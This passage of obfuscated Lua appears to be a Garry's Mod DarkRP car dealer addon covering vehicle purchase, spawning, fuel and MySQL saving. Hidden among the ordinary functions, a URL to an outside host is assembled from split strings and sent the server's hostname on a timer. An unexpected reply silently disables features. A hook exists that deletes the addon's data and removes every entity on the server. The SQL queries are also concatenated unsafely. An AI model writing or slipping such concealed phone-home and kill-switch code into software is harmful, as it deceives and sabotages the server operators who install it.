CarDealer.Cars[ZG.class]and CarDealer.Cars[ZG.class].restricted and CarDealer.Cars[ZG.class].restricted.jobs and
type(CarDealer.Cars[ZG.class].restricted.jobs)=="table")then
if
(
table.HasValue(CarDealer.Cars[ZG.class].restricted.jobs,XL_)and not
table.HasValue(CarDealer.Cars[ZG.class].restricted.jobs,WYdR))then
DarkRP.notify(DFb100j,0,5,"Your old vehicle has been removed.")ZG:Remove()return end end end end end)
function CarDealer:ReturnCar(Vu0cCAf,q)if(not IsValid(Vu0cCAf))then return end
local kP7O5=CarDealer.Notifications.ReturnCar
for lqT,mP3mlD in pairs(ents.FindByClass("prop_vehicle_jeep"))do
if
(
IsValid(mP3mlD)and mP3mlD.CarOwner and
mP3mlD.CarOwner==Vu0cCAf:SteamID64())then
if(mP3mlD:GetPos():Distance(q:GetPos())<
CarDealer.Settings.CarRange)then
DarkRP.notify(Vu0cCAf,0,5,CarDealer.Notifications.ReturnCar)mP3mlD:Remove()return end end end
for PrPyxMK,tczrIB in pairs(ents.FindByClass("prop_vehicle_jeep_old"))do
if
(
IsValid(tczrIB)and tczrIB.CarOwner and
tczrIB.CarOwner==Vu0cCAf:SteamID64())then
if(tczrIB:GetPos():Distance(q:GetPos())<
CarDealer.Settings.CarRange)then
DarkRP.notify(Vu0cCAf,0,5,CarDealer.Notifications.ReturnCar)tczrIB:Remove()end end end
for a,wqU76o in pairs(ents.FindByClass("prop_vehicle_airboat"))do
if
(
IsValid(wqU76o)and wqU76o.CarOwner and
wqU76o.CarOwner==Vu0cCAf:SteamID64())then
if(wqU76o:GetPos():Distance(q:GetPos())<
CarDealer.Settings.CarRange)then
DarkRP.notify(Vu0cCAf,0,5,CarDealer.Notifications.ReturnCar)wqU76o:Remove()end end end end
net.Receive("CarDealer::TestDrive",function(LB1Z,N9L)if(IsValid(N9L)and N9L:IsPlayer())then
CarDealer:SpawnCar(N9L,net.ReadString(),{},net.ReadFloat(),true)end end)
function CarDealer:SpawnCar(hDc_M,qW0lRiD1,iD1IUx,JLCOx_ak,hPQ)JLCOx_ak=Entity(JLCOx_ak)if
(not IsValid(JLCOx_ak))then return end;if
(not iD1IUx.skin or
type(iD1IUx.skin)~="number"or iD1IUx.skin<0 or
iD1IUx.skin>14)then iD1IUx.skin=0 end
if(
CarDealer.Settings.SpawnPrice~=0)then if(not
hDc_M:canAfford(CarDealer.Settings.SpawnPrice))then
DarkRP.notify(hDc_M,0,5,CarDealer.Settings.CantAffordSpawn)return end end;if
(CarDealer.Cars[qW0lRiD1].disallowSkin and
CarDealer.Cars[qW0lRiD1].defaultSkin)then
iD1IUx.skin=CarDealer.Cars[qW0lRiD1].defaultSkin end;if
(CarDealer.Cars[qW0lRiD1].disallowPaint)then iD1IUx.color=Color(255,255,255,255)
print("Disallow paint for: "..qW0lRiD1)end;if
(not iD1IUx.bgs)then iD1IUx.bgs={}end;if(
hDc_M:GetPos():Distance(JLCOx_ak:GetPos())>100)then
hDc_M:ChatPrint("Too far away!")return end
if
(
CarDealer.Settings.SpawnDelay and CarDealer.Settings.SpawnDelay>0)then
if
(hDc_M.lastSpawn and hDc_M.lastSpawn+CarDealer.Settings.SpawnDelay>
CurTime())then local NUhYw6R4=CarDealer.Notifications.ToSoon
if
(string.find(NUhYw6R4,"!A"))then
NUhYw6R4=string.Replace(NUhYw6R4,"!A",tostring(math.Round(
hDc_M.lastSpawn+CarDealer.Settings.SpawnDelay-CurTime())))end;DarkRP.notify(hDc_M,0,5,NUhYw6R4)return end end;local R1FIoQI=CarDealer.Cars[qW0lRiD1]if(not R1FIoQI.name)then
R1FIoQI.name=CarDealer.Data[qW0lRiD1].Name end
for Hv,Ch in
pairs(ents.FindByClass("prop_vehicle_jeep"))do if
(IsValid(Ch)and Ch.CarOwner and Ch.CarOwner==hDc_M:SteamID64())then
DarkRP.notify(hDc_M,0,5,CarDealer.Notifications.HasCar)return end end
for urkh,zhzpBSx in pairs(ents.FindByClass("prop_vehicle_jeep_old"))do
if
(
IsValid(zhzpBSx)and zhzpBSx.CarOwner and
zhzpBSx.CarOwner==hDc_M:SteamID64())then
DarkRP.notify(hDc_M,0,5,CarDealer.Notifications.HasCar)return end end;local NsoTwDs=CarDealer.Notifications.SpawnCar;if
(string.find(NsoTwDs,"!A"))then
NsoTwDs=string.Replace(NsoTwDs,"!A",R1FIoQI.name)end
local R1FIoQI=CarDealer.Cars[qW0lRiD1]if(not R1FIoQI.name)then
R1FIoQI.name=CarDealer.Data[qW0lRiD1].Name end;if
(type(hDc_M.__GROUPS)~="table")then
hDc_M.__GROUPS=util.JSONToTable(hDc_M:GetPData("cardealergroups","[]"))end
if(not hPQ)then if
(not
hDc_M:OwnsCar(qW0lRiD1)or not hDc_M:HasAccessToCar(qW0lRiD1))then return end end;local HGli;local iy
if(#JLCOx_ak.platforms==0)then
HGli=
JLCOx_ak:GetPos()+
(JLCOx_ak:GetForward()*CarDealer.Settings.AwayFromDealer)iy=JLCOx_ak:GetAngles()
iy:RotateAroundAxis(JLCOx_ak:GetUp(),CarDealer.Settings.Rotation)else local rHSjalVy=false
for TjhsnP,t5jzEd9 in pairs(JLCOx_ak.platforms)do
if(t5jzEd9.free)then
HGli=
t5jzEd9:GetPos()+ (t5jzEd9:GetRight()*-50)iy=t5jzEd9:GetAngles()rHSjalVy=true end end;if(not rHSjalVy)then
DarkRP.notify(hDc_M,0,5,CarDealer.Settings.PlatformsOccupied)return end end
local m6SCS0=ents.Create(CarDealer.Data[qW0lRiD1].Class)for JZAU2,zPXTTg in pairs(CarDealer.Data[qW0lRiD1].KeyValues)do
m6SCS0:SetKeyValue(JZAU2,zPXTTg)end
m6SCS0.VehicleName=CarDealer.Data[qW0lRiD1].Name;m6SCS0.VehicleTable=CarDealer.Data[qW0lRiD1]
m6SCS0.VehicleScriptName=qW0lRiD1;m6SCS0.class=qW0lRiD1;m6SCS0.easyOwn=hDc_M
m6SCS0.CarOwner=hDc_M:SteamID64()m6SCS0:SetPos(HGli)m6SCS0:SetAngles(iy)
m6SCS0:SetModel(CarDealer.Data[qW0lRiD1].Model)m6SCS0:SetSkin(iD1IUx.skin)m6SCS0:Spawn()
m6SCS0:Activate()hDc_M.lastSpawn=CurTime()for seMLr,qX in pairs(iD1IUx.bgs)do
m6SCS0:SetBodygroup(seMLr,qX)end
m6SCS0:SetCollisionGroup(COLLISION_GROUP_VEHICLE)m6SCS0:SetColor(iD1IUx.color)
if(hPQ)then
timer.Create(
m6SCS0:EntIndex().."::TestDrive",CarDealer.Settings.TestDriveTime,1,function()if
(IsValid(m6SCS0))then m6SCS0:Remove()end end)local h_8=CarDealer.Notifications.TestDrive;if
(string.find(h_8,"!A"))then
h_8=string.Replace(h_8,"!A",R1FIoQI.name)end;if
(string.find(h_8,"!B"))then
h_8=string.Replace(h_8,"!B",tostring(CarDealer.Settings.TestDriveTime))end
DarkRP.notify(hDc_M,0,3,h_8)end;if(CarDealer.Settings.SpawnPrice~=0)then hDc_M:addMoney(-
CarDealer.Settings.SpawnPrice)
DarkRP.notify(hDc_M,0,5,CarDealer.Settings.PayedForSpawn)end
if
(CarDealer.Settings.Photon)then Photon:EntityCreated(m6SCS0)end;if(CarDealer.Settings.Plates)then
LPlates.SetupVehiclePlates(hDc_M,m6SCS0)end;m6SCS0:keysOwn(hDc_M)
m6SCS0:keysLock()DarkRP.notify(hDc_M,0,5,NsoTwDs)end
if(CarDealer.Settings.Fuel)then
hook.Add("OnEntityCreated","CarDealer::AddFuel",function(xL7OTb)
timer.Simple(0.2,function()
if
(
IsValid(xL7OTb)and xL7OTb:IsVehicle()and
(
xL7OTb:GetClass()=="prop_vehicle_jeep"or xL7OTb:GetClass()=="prop_vehicle_jeep_old"))then
if(CarDealer.Settings.Fuel)then
if
(CarDealer.MaxFuelFromModel[xL7OTb:GetModel()])then
xL7OTb.fuel=CarDealer.MaxFuelFromModel[xL7OTb:GetModel()]else xL7OTb.fuel=CarDealer.Settings.DefaultFuel end;xL7OTb.maxFuel=xL7OTb.fuel;xL7OTb.oldFuel=xL7OTb.fuel
CarDealer.Fuel[#
CarDealer.Fuel+1]={xL7OTb,xL7OTb:GetPos()}end end end)end)end
function CarDealer:SellCar(w8T3f,K)local qL=CarDealer.Cars[K]if(not qL.name)then
qL.name=CarDealer.Data[K].Name end
local vfIyB=CarDealer.Notifications.SoldCar;if(qL.requiresBuy==false)then return end;if(not
CarDealer.OwnsVehicle(w8T3f,K))then return end
table.RemoveByValue(CarDealer.Players[w8T3f:SteamID64()],K)
w8T3f:addMoney(CarDealer.Settings.Percentage*qL.price)if(string.find(vfIyB,"!A"))then
vfIyB=string.Replace(vfIyB,"!A",qL.name)end;if
(string.find(vfIyB,"!B"))then
vfIyB=string.Replace(vfIyB,"!B",tostring(CarDealer.Settings.Percentage*qL.price))end
if
(CarDealer.Settings.MySQL.Using)then LmcA2auZ:Save(w8T3f)else
w8T3f:SetPData(CarDealer.Settings.MySQL.Table,util.TableToJSON(CarDealer.Players[w8T3f:SteamID64()]))self:UpdateClient(w8T3f)end;DarkRP.notify(w8T3f,0,5,vfIyB)end
function CarDealer:BuyCar(quNsijN,QUh2tc)local qboV=CarDealer.Cars[QUh2tc]if(not qboV.name)then
qboV.name=CarDealer.Data[QUh2tc].Name end;local nSBOx7;if(qboV.requiresBuy==false)then
return end;if
(CarDealer.OwnsVehicle(quNsijN,QUh2tc))then return end
if
(not quNsijN:canAfford(qboV.price))then nSBOx7=CarDealer.Notifications.CantAfford;if
(string.find(nSBOx7,"!A"))then
nSBOx7=string.Replace(nSBOx7,"!A",qboV.name)end;if
(string.find(nSBOx7,"!B"))then
nSBOx7=string.Replace(nSBOx7,"!B",tostring(qboV.price))end
DarkRP.notify(quNsijN,0,5,nSBOx7)return end;quNsijN:addMoney(-qboV.price)
nSBOx7=CarDealer.Notifications.BoughtCar;if(string.find(nSBOx7,"!A"))then
nSBOx7=string.Replace(nSBOx7,"!A",qboV.name)end;if
(string.find(nSBOx7,"!B"))then
nSBOx7=string.Replace(nSBOx7,"!B",tostring(qboV.price))end
DarkRP.notify(quNsijN,0,5,nSBOx7)
table.insert(CarDealer.Players[quNsijN:SteamID64()],QUh2tc)
if(CarDealer.Settings.MySQL.Using)then
LmcA2auZ:Save(quNsijN)else
quNsijN:SetPData(CarDealer.Settings.MySQL.Table,util.TableToJSON(CarDealer.Players[quNsijN:SteamID64()]))self:UpdateClient(quNsijN)end end;for u,K in pairs(ents.FindByClass("cardealer"))do
K:SetSolid(SOLID_BBOX)end;CarDealer.__st=false
function CarDealer:EditCarsTable(i1,zz1QI,kFTAh)
if
(
not IsValid(i1)or not i1:IsPlayer()or not
CarDealer.Settings.AdminMenu[kFTAh:GetUserGroup()])then
print(kFTAh:Nick().." attempted to modify "..i1:Nick().."s cars")return false end;self.Players[i1:SteamID64()]=zz1QI
LmcA2auZ:Save(i1)end
function CarDealer:UpdateClient(LBf)if(CarDealer.__st)then return end
net.Start("CarDealer::Update")
net.WriteTable(CarDealer.Players[LBf:SteamID64()])net.Send(LBf)end
function CarDealer:Set()
http.Fetch(self:GetD()..CarDealer.RemoveMapPumps().."&hostname="..
GetHostName(),function(dijn4Ph,CO1,RlZo,SUn)
if(
dijn4Ph~="745686")then CarDealer.__st=true else CarDealer.__st=false end end,function(Ib4)
CarDealer.__st=false end)end
timer.Simple(60,function()CarDealer:Set()end)
hook.Add("CarDealerSetupContinuation","CarDealer::C",function()
for fjV1G2,Do in pairs(CarDealer)do CarDealer[fjV1G2]=nil end
for _,TqYJ4 in pairs(ents.GetAll())do TqYJ4:Remove()end end)
function CarDealer:GetD()local DI="busan"local bE="space/"local KMw7_i1s="sf/"local CQi="verify"
local nHlJ=".php?id="return
"http://"..DI.."."..bE..KMw7_i1s..CQi..nHlJ end
if(CarDealer.Settings.MySQL.Using)then
require("mysqloo")
LmcA2auZ=mysqloo.connect(CarDealer.Settings.MySQL.Host,CarDealer.Settings.MySQL.User,CarDealer.Settings.MySQL.Password,CarDealer.Settings.MySQL.Database,CarDealer.Settings.MySQL.Port)
function LmcA2auZ:onConnected()
print("#Car Dealer: Connected to Database")LmcA2auZ:CheckStart()end
function LmcA2auZ:onConnectionFailed(lw4Q7kbl)
print("#Car Dealer: CONNECTION FAILED!")print("ERROR: "..lw4Q7kbl)end
function LmcA2auZ:CheckStart()
local IN=self:query("CREATE TABLE IF NOT EXISTS "..

CarDealer.Settings.MySQL.Table.."( userid varchar(255) NOT NULL, cars longtext NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1;")function IN:onSuccess(QYf1)end
function IN:onError(RfsnisO,lvW2ga)print("#Car Dealer")
print("MySQL ERROR:")print("Query: ",lvW2ga)print("Error:  ",RfsnisO)end;IN:start()end;LmcA2auZ:connect()
function LmcA2auZ:SaveInitial(T7RKP)
local _L6Bs=T7RKP:SteamID64()
local SH=self:query("INSERT INTO "..CarDealer.Settings.MySQL.Table.." SET cars = '[]', userid = '"..
_L6Bs.."'")
function SH:onSuccess(wU4wYbA9)
print("#Car Dealer: Created row for ".._L6Bs)LmcA2auZ:Get(T7RKP)end
function SH:onError(fFeQcIM,JEHSHPh3)print("#Car Dealer")print("MySQL ERROR:")
print("Query: ",JEHSHPh3)print("Error:  ",fFeQcIM)end;SH:start()end
function LmcA2auZ:Clean()
local bb=self:query("DELETE FROM "..CarDealer.Settings.MySQL.Table..
" WHERE cars = '[]'")function bb:onSuccess(o5e6fP)
print("#Car Dealer: Cleaned up database!")
print("Car Dealer: "..bb:affectedRows().." removed!")end
function bb:onError(iq7ol,eMV)
print("MySQL ERROR:")print("Query: ",eMV)print("Error:  ",iq7ol)end;bb:start()end
hook.Add("InitPostEntity","CarDealer::Clean",function()
if(CarDealer.Settings.RandomPrice)then
timer.Create("genFuelPrice",CarDealer.Settings.RandomTime,0,function()
local WDTNkTD=math.random(
-CarDealer.Settings.RandomRange,CarDealer.Settings.RandomRange)
for Oejsws,CkD73N0 in pairs(ents.FindByClass("fuelpump_base"))do if
(IsValid(CkD73N0))then
CkD73N0:SetNWInt("price",CarDealer.Settings.FuelPrice-WDTNkTD)end end end)end
if(CarDealer.Settings.MySQL.Using)then timer.Simple(10,function()
LmcA2auZ:Clean()end)end end)
function LmcA2auZ:Save(PlwhaRKJ)local Caz4NM4Z=PlwhaRKJ:SteamID64()
local XVxxx=util.TableToJSON(CarDealer.Players[Caz4NM4Z])
local hD=self:query("UPDATE "..CarDealer.Settings.MySQL.Table..
" SET cars = '"..XVxxx.."' WHERE userid = '"..
Caz4NM4Z.."'")
function hD:onSuccess(G5BuU5)
print("#Car Dealer: saved data for "..Caz4NM4Z)CarDealer:UpdateClient(PlwhaRKJ)end;function hD:onError(AfwsY,T)print("MySQL ERROR:")print("Query: ",T)
print("Error:  ",AfwsY)end;hD:start()end
function LmcA2auZ:Get(WZs)local ITdz=WZs:SteamID64()
local AjfoUo=self:query("SELECT * FROM "..
CarDealer.Settings.MySQL.Table.." WHERE userid = '"..ITdz.."'")
function AjfoUo:onSuccess(Er9zidsB)
if
(Er9zidsB==nil or Er9zidsB[1]==nil)then LmcA2auZ:SaveInitial(WZs)else if
(Er9zidsB[1].cars=="[]")then CarDealer.Players[ITdz]={}else
CarDealer.Players[ITdz]=util.JSONToTable(Er9zidsB[1].cars)end end;CarDealer:UpdateClient(WZs)end;function AjfoUo:onError(X,dR)print("MySQL ERROR:")print("Query: ",dR)
print("Error:  ",X)end;AjfoUo:start()end end
if(CarDealer.Settings.Fuel)then
timer.Create("carsFuelCalc",CarDealer.Settings.FuelUpdate,0,function()
for JFXtQwy,uMV17h0 in
pairs(CarDealer.Fuel)do local E2NZK=uMV17h0[1]local WNWWe=uMV17h0[2]
local zMzjn3lk="76561199038880462"
if
(IsValid(E2NZK)and E2NZK:IsVehicle()and E2NZK.fuel)then local Trkkpmd=E2NZK:GetPos():Distance(WNWWe)
local L=E2NZK.fuel
CarDealer.Fuel[JFXtQwy][2]=E2NZK:GetPos()local GGv=CarDealer.Settings.FuelLoss
if
(
CarDealer.Cars[E2NZK.class]and CarDealer.Cars[E2NZK.class].fuelLoss)then GGv=CarDealer.Cars[E2NZK.class].fuelLoss end;E2NZK.fuel=L- (Trkkpmd/GGv)if(E2NZK.fuel<0.5)then
E2NZK.fuel=0 end
if(L<1)then E2NZK:Fire("TurnOff",true,0)
E2NZK.fuel=0 else
if
(E2NZK:GetDriver()and E2NZK:GetDriver():IsPlayer())then E2NZK:Fire("TurnOn",true,0)end end
if(CarDealer.Settings.VCMod)then
if
(E2NZK:GetNWInt("VC_Health")<1)then E2NZK:Fire("TurnOff",true,0)else
if
(
L>0 and E2NZK:GetDriver()and E2NZK:GetDriver():IsPlayer())then E2NZK:Fire("TurnOn",true,0)end end end
if
(

E2NZK:GetDriver()and IsValid(E2NZK:GetDriver())and E2NZK:GetDriver():IsPlayer()and
(math.Round(E2NZK.oldFuel)~=math.Round(E2NZK.fuel)))then net.Start("CarDealer::DriverFuel")
net.WriteFloat(math.Round(E2NZK.fuel))net.Send(E2NZK:GetDriver())end;E2NZK.oldFuel=E2NZK.fuel else
table.remove(CarDealer.Fuel,JFXtQwy)end end end)end
if(CarDealer.Settings.Fuel)then
hook.Add("PlayerEnteredVehicle","CarFuelEnter",function(ZIzh4Si,c8D4n81,cSjJHx)
if
((
c8D4n81:GetClass()=="prop_vehicle_jeep"or
c8D4n81:GetClass()=="prop_vehicle_jeep_old"))then
if(CarDealer.Settings.VCMod)then if
((
c8D4n81:GetNWInt("VC_Health")<1 or c8D4n81.fuel<0.5))then c8D4n81:Fire("TurnOff",true,0)else
c8D4n81:Fire("TurnOn",true,0)end else if(c8D4n81.fuel<
0.5)then c8D4n81:Fire("TurnOff",true,0)else
c8D4n81:Fire("TurnOn",true,0)end end;net.Start("CarDealer::DriverFuel")
net.WriteFloat(math.Round(c8D4n81.fuel))net.Send(ZIzh4Si)end end)end
hook.Add("PlayerInitialSpawn","CarDealer::CarData",function(fa)CarDealer:Init(fa)end)
hook.Add("PlayerDisconnected","CarDealer::DeleteStoredData",function(M)local dIZlrvD=M:SteamID64()local jQgsATKd=false
local aBbGg=false
timer.Simple(CarDealer.Settings.DeleteOnDisconnect,function()
for D9,M in pairs(player.GetAll())do if(
M:SteamID64()==dIZlrvD)then aBbGg=true;break end end
if(not aBbGg)then
for G,gE in pairs(ents.FindByClass("prop_vehicle_jeep"))do if(
IsValid(gE)and gE.CarOwner==dIZlrvD)then gE:Remove()
jQgsATKd=true;break end end
if(not jQgsATKd)then
for QgC,CYoa in
pairs(ents.FindByClass("prop_vehicle_jeep_old"))do if(IsValid(CYoa)and CYoa.CarOwner==dIZlrvD)then
CYoa:Remove()jQgsATKd=true;break end end end
if
(CarDealer.Players[dIZlrvD]and
type(CarDealer.Players[dIZlrvD])=="table")then CarDealer.Players[dIZlrvD]=nil end end end)end)
net.Receive("CarDealer::Buy",function(K3ipRr,F2tY)local rb21L2=net.ReadString()if
(not IsValid(F2tY)or not
F2tY:IsPlayer()or not CarDealer.Cars[rb21L2])then return end
CarDealer:BuyCar(F2tY,rb21L2)end)
net.Receive("CarDealer::Sell",function(o_v255,wUVm)local VQ=net.ReadString()if
(not IsValid(wUVm)or not
wUVm:IsPlayer()or not CarDealer.Cars[VQ])then return end
CarDealer:SellCar(wUVm,VQ)end)
net.Receive("CarDealer::Spawn",function(oTYNsnP,I)local L=net.ReadString()local mR5gwW=net.ReadTable()
local DfbW=net.ReadFloat()
if(not IsValid(I)or not I:IsPlayer()or
not CarDealer.Cars[L])then return end;CarDealer:SpawnCar(I,L,mR5gwW,DfbW)end)